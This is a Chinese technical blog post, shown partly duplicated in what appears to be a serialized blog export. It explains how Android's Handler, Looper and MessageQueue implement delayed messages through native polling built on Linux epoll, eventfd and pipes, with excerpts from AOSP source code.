...\n}\n```\n\n原来Looper这个家伙很懒啊，直接调用了queue的 `next` 方法，并没有单独去处理消息delay时间的问题。结果还是MessageQueue最累。当然，Looper本身的职责也不是这些，它做好消息的分发就行了。\n\n来看MQ的 `next` 方法，马上我们就要进入仙境了：\n\n```java\nMessage next() {\n    final long ptr = mPtr; // 拿到MQ的native层引用\n    ...\n    int nextPollTimeoutMillis = 0; // 下一次轮询的超时时间，这也是我们首次看到poll这个词汇\n    for (;;) {\n        ...\n        // 【重点】又是一个native方法，它会进行阻塞，这就是为什么消息可以延迟的初步原因\n        nativePollOnce(ptr, nextPollTimeoutMillis);\n\n        synchronized (this) {\n            // 阻塞结束，开始获取并返回msg对象给Looper\n            final long now = SystemClock.uptimeMillis();\n            Message prevMsg = null;\n            Message msg = mMessages;\n            if (msg != null && msg.target == null) {\n                ...\n            }\n            if (msg != null) {\n                if (now < msg.when) {\n                    // 下一个消息时间未到，更新这个阻塞超时时间，for循环下一次便会利用到此时间\n                    // 这里就做了一次when - now的操作，回应我上文所述\n                    nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE);\n                } else {\n                    // Got a message.\n                    mBlocked = false;\n                    if (prevMsg != null) {\n                        prevMsg.next = msg.next;\n                    } else {\n                        mMessages = msg.next;\n                    }\n                    msg.next = null;\n                    ...\n                    return msg;\n                }\n            } else {\n                // No more messages.\n                nextPollTimeoutMillis = -1;\n            }\n            ...\n        }\n        ...\n    }\n}\n```\n\n从上述可见，我们一开始传进来的delay延时，经过一路波折，来到了 `nativePollOnce(ptr, nextPollTimeoutMillis)` 本地方法，此方法是阻塞调用，再结合前面的 `nativeWake(ptr)` 方法，我们可以对消息机制的延时原理有一个初步认知：\n\n- 当通过 `postDelayed` 发送延时消息后，传入的时间最终会通过 `nativePollOnce` 方法进行带超时的阻塞，以达到延时的目的，时间到后阻塞结束，`next` 方法再返回消息对象给Looper。\n- 在MessageQueue的 `enqueueMessage` 方法中会判断新插入的消息的时间是否小于队头消息的时间，以决定要不要立即唤醒，即通过 `nativeWake` 方法打断超时未到的阻塞。\n\nJava层分析到此其实差不多了，但是好奇的同学自然又会思考这个阻塞不会一直占用CPU资源吗？难道这就是Android耗电的真凶！？如果这么想的话，那你还是低估了Linux。为了进一步搞清楚这个Native阻塞，我们就要深入到Android系统的Native源码了。\n\n## Native层\n\n按照源码的规范，我们可以直接找到MessageQueue的cpp代码：[frameworks/base/core/jni/android_os_MessageQueue.cpp](https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/jni/android_os_MessageQueue.cpp;l=188;drc=master;bpv=0;bpt=1) 中的 `nativePollOnce` 函数：\n\n```cpp\nstatic void android_os_MessageQueue_nativePollOnce(JNIEnv* env, jobject obj,\n        jlong ptr, jint timeoutMillis) {\n    NativeMessageQueue* nativeMessageQueue = reinterpret_cast<NativeMessageQueue*>(ptr);\n    // 实际上是调用到了pollOnce\n    nativeMessageQueue->pollOnce(env, obj, timeoutMillis);\n}\n\nvoid NativeMessageQueue::pollOnce(JNIEnv* env, jobject pollObj, int timeoutMillis) {\n    mPollEnv = env;\n    mPollObj = pollObj;\n    mLooper->pollOnce(timeoutMillis); // 哟，结果在native层还是Looper在干活哦\n    mPollObj = NULL;\n    mPollEnv = NULL;\n    ...\n}\n```\n\n进一步找到 [system/core/libutils/Looper.cpp](https://cs.android.com/android/platform/superproject/+/master:system/core/libutils/Looper.cpp;drc=master;bpv=1;bpt=1;l=211) 的 `pollOnce`：\n\n```cpp\nint Looper::pollOnce(int timeoutMillis, int* outFd, int* outEvents, void** outData) {\n    int result = 0;\n    for (;;) {\n        ...\n        if (result != 0) {\n            ...\n            return result;\n        }\n        // timeout时间传到了这里，接着看pollInner函数\n        result = pollInner(timeoutMillis);\n    }\n}\n\nint Looper::pollInner(int timeoutMillis) {\n    ...\n    // 这里会根据下一个msg的时间做修正，如果早于传入的这个timeout，那就以更早的时间进行延时，避免漏掉msg\n    if (timeoutMillis != 0 && mNextMessageUptime != LLONG_MAX) {\n        nsecs_t now = systemTime(SYSTEM_TIME_MONOTONIC);\n        int messageTimeoutMillis = toMillisecondTimeoutDelay(now, mNextMessageUptime);\n        if (messageTimeoutMillis >= 0\n                && (timeoutMillis < 0 || messageTimeoutMillis < timeoutMillis)) {\n            timeoutMillis = messageTimeoutMillis;\n        }\n    }\n    // 初始返回值就是唤醒\n    int result = POLL_WAKE;\n    ...\n    // 这里设置标志位，准备进入idle状态（epoll_wait会挂起释放CPU资源）\n    mPolling = true;\n    struct epoll_event eventItems[EPOLL_MAX_EVENTS];\n    // 【重点】epoll_wait系统调用就是整个消息机制阻塞的真正位置，阻塞等待同时可以读取管道的通知，下文详解\n    int eventCount = epoll_wait(mEpollFd.get(), eventItems, EPOLL_MAX_EVENTS, timeoutMillis);\n    // epoll_wait返回事件（注意这里返回有可能是timeout时间到了，也可能是中途被唤醒），退出idle状态，重新取得CPU执行机会\n    mPolling = false;\n    ...\n    // 返回-1的话表示error了，直接goto到Done代码行\n    if (eventCount < 0) {\n        ...\n        result = POLL_ERROR;\n        goto Done;\n    }\n    // 返回0表示timeout时间到了（说明这期间没有新的消息导致中途唤醒），正常Done\n    if (eventCount == 0) {\n        result = POLL_TIMEOUT;\n        goto Done;\n    }\n    // 返回eventCount大于0，说明timeout未到，就有新的事件写入管道导致提前唤醒\n    for (int i = 0; i < eventCount; i++) {\n        int fd = eventItems[i].data.fd;\n        uint32_t epollEvents = eventItems[i].events;\n        if (fd == mWakeEventFd.get()) {\n            if (epollEvents & EPOLLIN) {\n                awoken(); // 【重点】被唤醒了\n            } else {\n                ...\n            }\n        } else {\n            ...\n        }\n    }\nDone: ;\n    ...\n    return result;\n}\n```\n\n`pollInner` 代码很长，但其实核心就是 `epoll_wait` 这个系统调用，我们先大概看看它的函数定义（[epoll_wait(2) — Linux manual page](https://man7.org/linux/man-pages/man2/epoll_wait.2.html) ， [Epoll-wiki](https://zh.wikipedia.org/wiki/Epoll)），后文再详解：\n\n```c\nint epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout);\n```\n\nepoll_wait这里也是**整个Android消息机制阻塞的真正位置，阻塞等待期间可以保证线程进入休眠状态，不占用CPU资源，同时监听所注册的事件**。\n\n简单地讲，就是等待注册在文件描述符 `epfd` 上的事件，等事件产生的时候，传入的events数组会被填充，以便于epoll_wait返回后处理事件，也就是我们上面源码中 `for (int i = 0; i < eventCount; i++)` 干的事情。所以这个epoll应该是一个**事件驱动的机制**。\n\n为什么不着急讲上面的 `awoken()` 函数，因为在此之前，我们必须基本了解Linux的**文件描述符**（fd）、**管道**（pipe）和**epoll**机制，有了这些预备知识我们就能明白一切了。\n\n## 内核知识简介\n\n#### 文件描述符（File Descriptor）\n\n以下部分简称FD。摘录[维基百科的概念](https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6)：\n\n> 计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。\n\n概念看起来有点抽象，在理解FD之前我们需要感悟Linux的设计思想：**一切皆文件**。“Linux中一切都可以看作文件，包括普通文件、链接文件、Socket以及设备驱动等，对其进行相关操作时，都可能会创建对应的文件描述符。文件描述符是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有I/O操作相关的系统调用（例如read、write等）都需要通过文件描述符。”\n\n可见，在Linux中，FD就是一种宝贵的系统资源，就像工业时代的石油一样，没有它，我们的文件系统就无法运转。本质上，一个Linux进程启动后，会在内核空间生成文件描述符表（FD Table），记录当前进程所有可用的FD，也即映射着该进程所有打开的文件，这里引用一张其他大佬的[图](http://c.biancheng.net/view/3066.html)，就更形象了：\n\n![](https://imgconvert.csdnimg.cn/img_convert/9419696c40b1897d7d7d7f46ba2ffd63.gif)\n\n**FD实际上就是文件描述符表的数组下标（所以是非负整数）**。通俗地总结就是系统操作I/O资源的钥匙。更多细节大家可自行查阅或参考文末链接，此处点到为止。\n\n我们由此还可以萌生一个初步概念：有了方便的文件操作，我们就能实现跨进程通信了。\n\n#### 管道（pipe）\n\n那么什么又是管道呢？同样地，我们先看看[百科的概念](https://zh.wikipedia.org/wiki/%E7%AE%A1%E9%81%93_(Unix))：\n\n> 在类Unix操作系统（以及一些其他借用了这个设计的操作系统，如Windows）中，管道（英语：Pipeline）是一系列将标准输入输出链接起来的进程，其中每一个进程的输出被直接作为下一个进程的输入。\n> 这个概念是由道格拉斯·麦克罗伊为Unix命令行发明的，因与物理上的管道相似而得名。\n\n这个概念还算比较形象，管道就是通常用于进程间通信的一种机制。如其名，就像水管的一端输水，另一端接水。pipe的发明人发现系统操作执行命令的时候，经常有需求要将一个程序的输出交给另一个程序进行处理，这种操作可以使用输入输出配合文件来实现，比如：\n\n```bash\nls > abc.txt # 把当前目录的文件列表输入到abc文本\ngrep xxx abc.txt # adb文本作为输出，让grep程序查找内容xxx\n```\n\n这确实很麻烦，管道的出现简化了这个操作，现在我们可以用管道符（通常这么称呼）竖线来连接两个命令：\n\n```bash\nls | grep xxx\n```\n\n达到同样的效果，还不需要显式地产生文件。shell会用一个管道连接两个进程的输入输出，以此实现跨进程通信。因此，我们可以把管道的本质理解成一个文件，前一个进程用写的方式打开文件，后一个进程用读的方式打开。所以管道的系统调用函数是这样的：\n\n```c\nint pipe(int pipefd[2]);\n```\n\n函数调用后会创建2个文件描述符，即填充pipefd数组，其中pipefd[0]是读方式打开，pipefd[1]是写方式打开，分别作为管道的读和写描述符。管道虽然形式上是文件，但本身并不占用磁盘存储空间，而是占用的内存空间，所以管道是一个操作方式和文件相同的内存缓冲区（所以我们也不用狭隘地理解Linux中的文件，并非存在磁盘上的才叫文件）。**写入管道的数据会被缓存到直到另一端读取为止，所以上述命令是阻塞的**，在ls没有结果产生之前grep并不会执行。\n\n所以在实践中，我们通常让一个进程关闭读端，另一个进程关闭写端，以实现单工通信，引用一张其他大佬的[图](https://zhuanlan.zhihu.com/p/58489873)：\n\n![](https://imgconvert.csdnimg.cn/img_convert/ed02bb53a696f14c3e854c2573a164b8.png)\n\n类似这样的代码，了解其形式即可（更多细节可以参考文末链接）：\n\n```c\n// 父进程fork产生子进程后\n// parent进程\nread(pipefd[0], ...);\n// child进程\nwrite(pipefd[1], ...);\n```\n\n此外，我们必须清楚的是，**pipe并不只能用于跨进程通信，在同一个进程内当然也是可用的**。\n\n#### epoll\n\n了解文件描述符和管道后，我们终于可以讲epoll机制了。依然先看定义：\n\n> epoll是Linux内核的可扩展I/O事件通知机制。于Linux 2.5.44首度登场，它设计目的旨在取代既有POSIX select(2)与poll(2)系统函数，让需要大量操作文件描述符的程序得以发挥更优异的性能。epoll 实现的功能与 poll 类似，都是监听多个文件描述符上的事件。\n> epoll 通过使用红黑树(RB-tree)搜索被监控的文件描述符(file descriptor)。在 epoll 实例上注册事件时，epoll 会将该事件添加到 epoll 实例的红黑树上并注册一个回调函数，当事件发生时会将事件添加到就绪链表中。\n\n说明epoll是一种I/O**事件通知机制**（事件驱动的，犹如观察者模式）。我们上文提到管道机制，需要一端写数据另一端才能读数据，但在实践中，我们往往不能这样无尽地等待，而是**希望有一个监听，你什么时候写再通知我去读**。\n\n在epoll出现之前，也有诸如select和poll这样的监听机制，但是效率比较低，有些需要无差别遍历FD，虽然也是非阻塞，但唤醒后要轮询I/O，或者是有FD监听数量上限等缺点，具体此处不赘述。\n\n总之，epoll解决了这些问题，实现了高性能的I/O多路复用，还使用[mmap](https://www.cnblogs.com/huxiao-tee/p/4660352.html)加速内核与用户空间的消息传递。[epoll的系统调用](https://man7.org/linux/man-pages/man7/epoll.7.html)也比较简单，就3个函数：\n\n```c\n// 在内核中创建epoll实例并返回一个epoll文件描述符\nint epoll_create(int size);\nint epoll_create1(int flags);\n// 向epfd（上面create的）对应的epoll实例添加、修改或删除对fd（即第3个参数）上事件event的监听\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);\n// 这个函数我们上文就提到了，它等待注册在epfd上面的事件，事件从events参数中带出\nint epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout);\n```\n\nepoll内部实现还是比较复杂的，用红黑树结构管理fd，双向链表结构管理回调的事件，具体可以参考文末链接。简单的讲一下原理，`epoll_ctl` 函数会把传入的fd和event进行存储，并与相应的设备驱动程序建立关系，当相应的事件发生时，就会调用内部的回调函数将事件添加到链表中，最终通知线程唤醒，`epoll_wait` 得以返回。没有事件发生时，`epoll_wait` 就是挂起状态。 \n\n这里**注意不要混淆了**：epfd是epoll程序实例的描述符或者说索引；fd是与你想要监听的事件所对应的描述符，最终读写管道依赖的也是这个fd。\n\n## 回溯Native层\n\n终于搞清楚了epoll，我们再回去看MessageQueue和Looper的Native源码，就非常清晰了。\n\n还记得我们上文MQ中的mPtr变量吗，实际上在MQ的构造方法中进行了初始化：\n\n```java\nMessageQueue(boolean quitAllowed) {\n    mQuitAllowed = quitAllowed;\n    mPtr = nativeInit(); // 本地调用\n}\n```\n\n所以在Native层也有一个MQ对象，mPtr是MQ在Native层的一个映射引用，方便上层寻址访问：\n\n```cpp\nstatic jlong android_os_MessageQueue_nativeInit(JNIEnv* env, jclass clazz) {\n    NativeMessageQueue* nativeMessageQueue = new NativeMessageQueue();\n    ...\n    return reinterpret_cast<jlong>(nativeMessageQueue); // long类型，实际上就是个地址\n}\n\nNativeMessageQueue::NativeMessageQueue() : mPollEnv(NULL), mPollObj(NULL), mExceptionObj(NULL) {\n    mLooper = Looper::getForThread();\n    if (mLooper == NULL) {\n        mLooper = new Looper(false); // Native的MQ在初始化时还创建了Looper的实例\n        Looper::setForThread(mLooper);\n    }\n}\n```\n\n再看看Looper的初始化过程：\n\n```cpp\nLooper::Looper(bool allowNonCallbacks)\n    ...\n    // eventfd系统函数创建一个文件描述符，赋值给mWakeEventFd（唤醒事件描述符），待会儿管道的读写都会在此FD上进行\n    mWakeEventFd.reset(eventfd(0, EFD_NONBLOCK | EFD_CLOEXEC));\n    ...\n    // 【重点】构造了epoll实例\n    rebuildEpollLocked();\n}\n\nvoid Looper::rebuildEpollLocked() {\n    // 如果已经有epoll实例对应的描述符，先重置\n    if (mEpollFd >= 0) {\n        ...\n        mEpollFd.reset();\n    }\n\n    // 创建新的epoll实例和唤醒管道（wake pipe）\n    // 【重点】此处用epoll_create1函数创建了实例并将返回赋值给mEpollFd描述符\n    mEpollFd.reset(epoll_create1(EPOLL_CLOEXEC));\n\n    struct epoll_event eventItem;\n    memset(& eventItem, 0, sizeof(epoll_event));\n    eventItem.events = EPOLLIN; // IN，监听管道的输入（即write）操作\n    // 唤醒事件fd要由event数据持有，等会儿唤醒时才能进行查找匹配\n    eventItem.data.fd = mWakeEventFd.get();\n    // 【重点】用epoll_ctl函数注册唤醒事件的监听，EPOLL_CTL_ADD表示添加事件的操作标志\n    int result = epoll_ctl(mEpollFd.get(), EPOLL_CTL_ADD, mWakeEventFd.get(), &eventItem);\n    ...\n}\n```\n\n此时我们再回过头去看Looper的 `pollInner` 函数，`epoll_create1` 、  `epoll_ctl`  、 `epoll_wait` 这三个epoll流程就这样联系了起来：\n\n```cpp\nint Looper::pollInner(int timeoutMillis) {\n    ...\n    // 【重点】epoll_wait系统调用就是整个消息机制阻塞的真正位置，阻塞等待同时可以读取管道的通知\n    int eventCount = epoll_wait(mEpollFd.get(), eventItems, EPOLL_MAX_EVENTS, timeoutMillis);\n    ...\n    // 返回eventCount大于0，说明timeout未到，就有新的事件写入管道导致提前唤醒\n    for (int i = 0; i < eventCount; i++) {\n        int fd = eventItems[i].data.fd;\n        uint32_t epollEvents = eventItems[i].events;\n        if (fd == mWakeEventFd.get()) { // 查找匹配唤醒事件\n            if (epollEvents & EPOLLIN) {\n                awoken(); // 【重点】被唤醒\n            } else {\n    ...\nDone: ;\n    ...\n    return result;\n}\n            \nvoid Looper::awoken() {\n    uint64_t counter;\n    // 进行读操作\n    TEMP_FAILURE_RETRY(read(mWakeEventFd.get(), &counter, sizeof(uint64_t)));\n}\n```\n\n可见，`awoken` （被唤醒的意思）函数实际上就是一个管道的读操作，既然此时被epoll事件驱动唤醒起来读，那么肯定就是监听到对应的写操作导致的，显然，写操作就在 `wake` 函数中：\n\n```cpp\nvoid Looper::wake() {\n    uint64_t inc = 1;\n    // 往wake pipe里面写了一个1，触发了唤醒\n    ssize_t nWrite = TEMP_FAILURE_RETRY(write(mWakeEventFd.get(), &inc, sizeof(uint64_t)));\n    ...\n}\n```\n\n这里需要额外提醒一下，旧版本的源码是这样创建唤醒事件描述符的：\n\n```cpp\nint wakeFds[2];\nint result = pipe(wakeFds);\nmWakeReadPipeFd = wakeFds[0];\nmWakeWritePipeFd = wakeFds[1];\n```\n\n读和写是两个描述符，而最新的系统源码中只用了一个mWakeEventFd描述符，可能是考虑到Handler消息机制并不需要跨进程的缘故，具体还有待研究。\n\n上述的 `Looper::wake()` 函数源头其实就是是由MQ的 `nativeWake` 函数调用的：\n\n```cpp\nstatic void android_os_MessageQueue_nativeWake(JNIEnv* env, jclass clazz, jlong ptr) {\n    NativeMessageQueue* nativeMessageQueue = reinterpret_cast<NativeMessageQueue*>(ptr);\n    nativeMessageQueue->wake(); // MQ内部会进一步调用Looper::wake()\n}\n```\n\n回想一下上文，`nativeWake(mPtr);` 在Java层就是由 `enqueueMessage` 方法调用的，即消息入队时。至此，我们终于贯通了整个流程，从Java层一直探索到了Linux内核的系统调用，喜大普奔啊！\n\n总结一下，回到标题，为什么说**没有epoll就没有Handler**。因为Handler + Looper + MessageQueue这一套消息机制之所以可以处理延时消息，且达到事件驱动的效果，还不占用CPU资源，究其本质就是Native层使用了Linux内核的epoll I/O事件通知机制。满足了两个场景：\n\n- 当通过 `postDelayed` 发送延时消息后，传入的时间最终会通过 `nativePollOnce` 方法进行带超时的阻塞，本质上是因为 `epoll_wait` 函数的挂起，达到了延时的目的。\n\n  时间到后阻塞结束，`epoll_wait` 返回，线程被重新唤醒并获得CPU资源，且epoll事件数（event_count）为0，说明中途没被唤醒，然后 `nativePollOnce` 直接返回，进而MQ的 `next` 方法再返回消息对象给上层Looper。\n\n- 在MessageQueue的 `enqueueMessage` 方法中会判断新插入的消息的时间是否小于队头消息的时间，以决定要不要立即唤醒，即通过 `nativeWake` 方法打断超时未到的阻塞。\n\n  若需唤醒，便会往wake pipe唤醒管道中写入数据（其实就是一个整数1），由于epoll监听了mWakeEventFd唤醒事件描述符，所以此时 `epoll_wait` 结束了挂起状态，返回事件数大于0，进而调用到 `awoken`，最后 `nativePollOnce` 返回result为POLL_WAKE，上层消息得以继续处理。因为我们知道Looper的loop是一直在循环调用next的，如果底层不醒，上层就会阻塞。\n\n所以要么是timeout到了自动唤醒，要么是由于新消息插入导致主动唤醒。用不太严谨的流程图来描述一下主动唤醒的过程：\n\n![](https://imgconvert.csdnimg.cn/20201119000301533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n## 后话\n\n在应用进程退到后台时，一般情况下就没有什么消息发送了，所以主线程便阻塞在queue.next()中的 `nativePollOnce` 方法里，并释放CPU资源进入休眠状态，并不会消耗大量CPU资源。即便在前台，只要你的UI没有动画绘制或者没有触摸交互，也是差不多的状态。这也回答了为什么Looper中在进行无限循环却不会导致异常耗电的问题。\n\n关于Linux系统调用为什么可以挂起且不占用CPU时间片，CPU的定时器和中断又是怎么实现的？那可能就涉及到硬件知识了，好好复习组成原理吧哈哈哈。后续有空我也会补充上来。\n\n其实研究到最后，我才悟出了为什么epoll要叫epoll，因为它和原来poll机制的最大区别就是改善成了event（事件）驱动，这个e如果我没猜错的话应该代表的就是event。\n\n## 参考\n\n- [Android中的Handler的Native层研究](https://my.oschina.net/u/3863980/blog/1933086)\n- [Linux 文件描述符到底是什么？](http://c.biancheng.net/view/3066.html)\n- [理解Linux的文件描述符FD与Inode](https://zhuanlan.zhihu.com/p/143430585)\n- [文件描述符fd（File Descriptor）简介](https://juejin.im/post/6844904005202608136)\n- [Linux 的进程间通信：管道](https://zhuanlan.zhihu.com/p/58489873)\n- [Linux管道命令（pipe）](https://www.jianshu.com/p/9c0c2b57cb73)\n- [Linux下的I/O复用与epoll详解](https://www.cnblogs.com/lojunren/p/3856290.html)\n- [异步阻塞IO —— epoll](https://blog.csdn.net/sunyurun/article/details/8194979)\n- [Handler 中的 epoll](https://www.jianshu.com/p/1cda21639f3e)\n","source":"_posts/2020-11-18-源码茶舍之没有epoll就没有Handler.md","raw":"---\nlayout:     post\ntitle:      源码茶舍之没有epoll就没有Handler\nsubtitle:   探索发现。\ndate:       2020-11-18\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Linux\n    - Android\n    - AOSP\n---\n\n> Handler，英文释义：处理者，处理程序。他就是Android系统中的打工人，背负着传递消息的重任。很多人在第一次尝试去阅读framework源码时，可能也是从Handler消息机制开始的，我们会发现源码的很多地方都用到了Handler。然而，他好像并没有我们想象的那么简单，如果我们要深入探索的话，可以一直追溯到Linux内核。\n\n## 预备\n\n本文分析源码均基于API 29，来源于官方AOSP：[cs.android.com](https://cs.android.com/android/platform/superproject/)\n\n## 问号\n\nHandler的API使用还是比较简单的，我们比较常用的就是通过类似如下方式来发送一个Runnable到Handler所在线程去执行：\n\n```java\nnew Handler().post(() -> { /* do something */ });\nnew Handler().postDelayed(() -> { /* do something after 3s */ }, 3000);\n```\n\n这里为了简单直接用了匿名类，当然你也可以实现自定义的Handler并重写 `handleMessage` 方法来处理消息。`post` 最终其实还是调用到了Handler的  `sendMessageDelayed` 方法，将Runnable封装成一个Message发送到消息队列MessageQueue中，最后再由Looper循环将其取出，再交回Handler来处理。因此我们在子线程调用主线程的Handler来发送消息时，就达到了异步执行任务再将结果告知主线程的目的。\n\n好奇的同学就会有问号了，**这个上面的delay延迟执行是如何实现的（今天的重点）？**是定时器吗？还是周期性轮询？还是事件驱动？带着这些疑问，就不得不深入源码了。\n\n## Java层\n\n废话不多说直接看Handler源码：\n\n```java\npublic final boolean sendMessageDelayed(@NonNull Message msg, long delayMillis) {\n    if (delayMillis < 0) {\n        delayMillis = 0;\n    }\n    return sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);\n}\n\npublic boolean sendMessageAtTime(@NonNull Message msg, long uptimeMillis) {\n    MessageQueue queue = mQueue;\n    ...\n    return enqueueMessage(queue, msg, uptimeMillis);\n}\n```\n\n这里有个细节，最终调用的是 `sendMessageAtTime` 方法，且并没有直接把delay时长传进去，而是通过加当前时间得到一个确切时间作为参数传递的。这样做的原因：后续调用到系统底层时，若再需要这个delay，会用这个确切的uptime减去新的当前时间，保证精准，减少误差（因为从应用层调用到底层还是需要不少时间的）。\n\nHandler的 `enqueueMessage` 方法稍作处理后会调用到MessageQueue的同名方法，在分析之前我们大脑中先保留一个粗浅的概念以便于理解后面的源码，就是**当消息队列为空或者队头的消息delay时间还没到时，相关代码阻塞（但线程释放CPU资源进入休眠状态），新的消息来时才可能唤醒**，后面我们会剖析其原理。说回来，先看MessageQueue的 `enqueueMessage` ：\n\n```java\nboolean enqueueMessage(Message msg, long when) { // when就是上面的uptimeMillis\n    ...\n    synchronized (this) {\n        ...\n        msg.when = when; // 刚才得到的uptimeMillis赋值给msg消息对象了\n        Message p = mMessages; // 为什么mMessages命名是复数，因为是一个链表结构，来存储消息队列\n        boolean needWake; // 是否需要唤醒，为什么要唤醒？后面会讲到\n        if (p == null || when == 0 || when < p.when) {\n            // 插入消息到队头，如果阻塞就唤醒\n            msg.next = p;\n            mMessages = msg;\n            needWake = mBlocked;\n        } else {\n            // 下面这一堆（比如isAsynchronous）可以暂时不管，只用知道是在做新消息插入到链表的操作就可以了\n            needWake = mBlocked && p.target == null && msg.isAsynchronous();\n            Message prev;\n            for (;;) {\n                prev = p;\n                p = p.next;\n                // for循环结合这里的if条件，保证了消息是按when时间排序的\n                if (p == null || when < p.when) {\n                    break;\n                }\n                if (needWake && p.isAsynchronous()) {\n                    needWake = false;\n                }\n            }\n            msg.next = p; // 经过上面的变换，这里的p实际上是prev原本的next节点\n            prev.next = msg; // 再更新prev的next节点，msg正式插入消息队列\n        }\n        if (needWake) {\n            // 【重点】进行native方法调用唤醒，这里的mPtr其实是MessageQueue在native层对象的引用，后面会讲到\n            nativeWake(mPtr);\n        }\n    }\n    return true;\n}\n```\n\n这段代码比较简单，主要就是把新来的消息按delay时间排序入队，并在必要情况下进行唤醒操作。产生的疑问便是：\n\n- 这个唤醒是唤醒了个什么？为什么要进行native方法调用？\n- 传进来的when时间字段赋值给msg了，后续又如何利用的呢？\n\n带着这些问题，我们就要去找Looper了，因为它是整个消息机制流水线的发动机，其动力在 `loop` 方法：\n\n```java\npublic static void loop() {\n    final Looper me = myLooper(); // 一个线程对应一个Looper\n    ...\n    final MessageQueue queue = me.mQueue; // 每个Looper对应一个消息队列\n    ...\n    for (;;) {\n        Message msg = queue.next(); // might block（会阻塞）\n        ...\n    }\n    ...\n}\n```\n\n原来Looper这个家伙很懒啊，直接调用了queue的 `next` 方法，并没有单独去处理消息delay时间的问题。结果还是MessageQueue最累。当然，Looper本身的职责也不是这些，它做好消息的分发就行了。\n\n来看MQ的 `next` 方法，马上我们就要进入仙境了：\n\n```java\nMessage next() {\n    final long ptr = mPtr; // 拿到MQ的native层引用\n    ...\n    int nextPollTimeoutMillis = 0; // 下一次轮询的超时时间，这也是我们首次看到poll这个词汇\n    for (;;) {\n        ...\n        // 【重点】又是一个native方法，它会进行阻塞，这就是为什么消息可以延迟的初步原因\n        nativePollOnce(ptr, nextPollTimeoutMillis);\n\n        synchronized (this) {\n            // 阻塞结束，开始获取并返回msg对象给Looper\n            final long now = SystemClock.uptimeMillis();\n            Message prevMsg = null;\n            Message msg = mMessages;\n            if (msg != null && msg.target == null) {\n                ...\n            }\n            if (msg != null) {\n                if (now < msg.when) {\n                    // 下一个消息时间未到，更新这个阻塞超时时间，for循环下一次便会利用到此时间\n                    // 这里就做了一次when - now的操作，回应我上文所述\n                    nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE);\n                } else {\n                    // Got a message.\n                    mBlocked = false;\n                    if (prevMsg != null) {\n                        prevMsg.next = msg.next;\n                    } else {\n                        mMessages = msg.next;\n                    }\n                    msg.next = null;\n                    ...\n                    return msg;\n                }\n            } else {\n                // No more messages.\n                nextPollTimeoutMillis = -1;\n            }\n            ...\n        }\n        ...\n    }\n}\n```\n\n从上述可见，我们一开始传进来的delay延时，经过一路波折，来到了 `nativePollOnce(ptr, nextPollTimeoutMillis)` 本地方法，此方法是阻塞调用，再结合前面的 `nativeWake(ptr)` 方法，我们可以对消息机制的延时原理有一个初步认知：\n\n- 当通过 `postDelayed` 发送延时消息后，传入的时间最终会通过 `nativePollOnce` 方法进行带超时的阻塞，以达到延时的目的，时间到后阻塞结束，`next` 方法再返回消息对象给Looper。\n- 在MessageQueue的 `enqueueMessage` 方法中会判断新插入的消息的时间是否小于队头消息的时间，以决定要不要立即唤醒，即通过 `nativeWake` 方法打断超时未到的阻塞。\n\nJava层分析到此其实差不多了，但是好奇的同学自然又会思考这个阻塞不会一直占用CPU资源吗？难道这就是Android耗电的真凶！？如果这么想的话，那你还是低估了Linux。为了进一步搞清楚这个Native阻塞，我们就要深入到Android系统的Native源码了。\n\n## Native层\n\n按照源码的规范，我们可以直接找到MessageQueue的cpp代码：[frameworks/base/core/jni/android_os_MessageQueue.cpp](https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/jni/android_os_MessageQueue.cpp;l=188;drc=master;bpv=0;bpt=1) 中的 `nativePollOnce` 函数：\n\n```cpp\nstatic void android_os_MessageQueue_nativePollOnce(JNIEnv* env, jobject obj,\n        jlong ptr, jint timeoutMillis) {\n    NativeMessageQueue* nativeMessageQueue = reinterpret_cast<NativeMessageQueue*>(ptr);\n    // 实际上是调用到了pollOnce\n    nativeMessageQueue->pollOnce(env, obj, timeoutMillis);\n}\n\nvoid NativeMessageQueue::pollOnce(JNIEnv* env, jobject pollObj, int timeoutMillis) {\n    mPollEnv = env;\n    mPollObj = pollObj;\n    mLooper->pollOnce(timeoutMillis); // 哟，结果在native层还是Looper在干活哦\n    mPollObj = NULL;\n    mPollEnv = NULL;\n    ...\n}\n```\n\n进一步找到 [system/core/libutils/Looper.cpp](https://cs.android.com/android/platform/superproject/+/master:system/core/libutils/Looper.cpp;drc=master;bpv=1;bpt=1;l=211) 的 `pollOnce`：\n\n```cpp\nint Looper::pollOnce(int timeoutMillis, int* outFd, int* outEvents, void** outData) {\n    int result = 0;\n    for (;;) {\n        ...\n        if (result != 0) {\n            ...\n            return result;\n        }\n        // timeout时间传到了这里，接着看pollInner函数\n        result = pollInner(timeoutMillis);\n    }\n}\n\nint Looper::pollInner(int timeoutMillis) {\n    ...\n    // 这里会根据下一个msg的时间做修正，如果早于传入的这个timeout，那就以更早的时间进行延时，避免漏掉msg\n    if (timeoutMillis != 0 && mNextMessageUptime != LLONG_MAX) {\n        nsecs_t now = systemTime(SYSTEM_TIME_MONOTONIC);\n        int messageTimeoutMillis = toMillisecondTimeoutDelay(now, mNextMessageUptime);\n        if (messageTimeoutMillis >= 0\n                && (timeoutMillis < 0 || messageTimeoutMillis < timeoutMillis)) {\n            timeoutMillis = messageTimeoutMillis;\n        }\n    }\n    // 初始返回值就是唤醒\n    int result = POLL_WAKE;\n    ...\n    // 这里设置标志位，准备进入idle状态（epoll_wait会挂起释放CPU资源）\n    mPolling = true;\n    struct 